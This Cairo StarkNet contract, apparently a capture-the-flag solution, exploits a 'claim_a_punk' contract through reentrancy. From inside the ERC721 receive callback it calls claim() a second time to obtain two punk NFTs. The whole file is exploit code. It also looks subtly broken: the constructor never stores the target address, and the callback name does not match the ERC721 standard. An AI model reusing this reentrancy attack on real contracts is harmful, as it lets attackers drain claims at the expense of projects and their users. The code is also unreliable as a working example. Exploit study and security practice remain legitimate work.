// SPDX-License-Identifier: MIT

// @author Gershon Ballas <gershon@gingerlabs.xyz>

// This contract is used for exploiting claim_a_punk.cairo

%lang starknet
%builtins pedersen range_check

from starkware.cairo.common.cairo_builtins import HashBuiltin
from starkware.cairo.common.uint256 import Uint256
from starkware.cairo.common.math import assert_not_zero
from starkware.starknet.common.syscalls import get_contract_address
from starkware.cairo.common.math_cmp import is_le

const TRUE = 1;
const FALSE = 0;
const IERC721_RECEIVER_ID = 0x150b7a02;

@contract_interface
namespace ClaimAPunk {
    func claim(to: felt) {
    }
}

@contract_interface
namespace IERC721 {
    func balanceOf(owner: felt) -> (balance: Uint256) {
    }
}

@contract_interface
namespace IERC721Receiver {
    func onERC721Received(
        operator: felt, from_: felt, tokenId: Uint256, data_len: felt, data: felt*
    ) -> (selector: felt) {
    }
}


// Claim-a-Punk contract address
@storage_var
func _claim_a_punk_address() -> (address: felt){
}

// NFT contract representing punks
@storage_var
func _punks_nft_address() -> (address: felt){
}

@constructor
func constructor{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}(
    claim_a_punk_address: felt,
    punks_nft_address: felt
) {
    // Save punks NFT address
    _punks_nft_address.write(punks_nft_address);

    return ();
}

@external
func exploit{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}() {
    // Call claim-a-punk's claim() with this contract as the receiver
    let (this_contract_address) = get_contract_address();
    let (claim_a_punk_address) = _claim_a_punk_address.read();
    ClaimAPunk.claim(
        contract_address = claim_a_punk_address,
        to = this_contract_address
    );

    return();
}

@external
func onERC721Receive{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}(
    operator: felt, from_: felt, tokenId: Uint256, data_len: felt, data: felt*
) -> (selector: felt) {
    // We only want to claim 2 NFT's - make sure we don't already have that
    let (punks_nft_address) = _punks_nft_address.read();
    let (this_contract_address) = get_contract_address();
    let (balance) = IERC721.balanceOf(
        contract_address = punks_nft_address,
        owner = this_contract_address
    );

    // same as `if (balance > 1)`
    let is_balance_lt_2 = is_le(balance.low, 1);
    if (is_balance_lt_2 == FALSE) {
        return (selector=IERC721_RECEIVER_ID);
    }
    
    // Call claim-a-punk's claim() again
    let (claim_a_punk_address) = _claim_a_punk_address.read();
    ClaimAPunk.claim(
        contract_address = claim_a_punk_address,
        to = this_contract_address
    );

    // Return required selector
    return (selector=IERC721_RECEIVER_ID);
}

// Have to implement ERC165 in order to get onERC721Receive() called
func supportsInterface(interfaceId: felt) -> (success: felt) {
    return (success=TRUE);
}
